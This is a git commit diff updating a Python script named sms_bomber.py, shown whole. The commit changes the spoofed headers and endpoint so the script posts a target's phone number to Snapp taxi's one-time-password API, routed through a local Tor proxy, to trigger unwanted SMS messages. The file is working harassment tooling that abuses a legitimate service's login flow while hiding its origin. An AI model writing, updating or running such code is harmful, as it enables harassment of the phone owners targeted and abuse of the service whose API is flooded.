9500e8981907ae818a9a76217b16b148d7563dd2
Liosion Mikealson <57588337+Liosion@users.noreply.github.com>
2020-08-15 04:14:20 +0430

    Update sms_bomber.py

--- sms_bomber.py
+++ sms_bomber.py
@@ -7,10 +7,10 @@ proxy = {"https": "127.0.0.1:9050"}
 
 def snap(phone):
     #snap api
-    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
+    snapH = {"x-app-name":"passenger-android", "Package-Name":"cab.snapp.passenger.play", "locale":"fa-IR", "x-app-version-code":"207", "x-app-version":"207", "Content-Type":"application/json; charset=utf-8", "Host":"oauth-passenger.snapp.site", "Accept-Encoding":"gzip, deflate"}
     snapD = {"cellphone":phone}
     try:
-        snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD, proxies=proxy)
+        snapR = requests.post("https://oauth-passenger.snapp.site/v2/otp", headers=snapH, json=snapD, proxies=proxy)
         if "OK" in snapR.text:
             print ("sended sms:)")
         else:
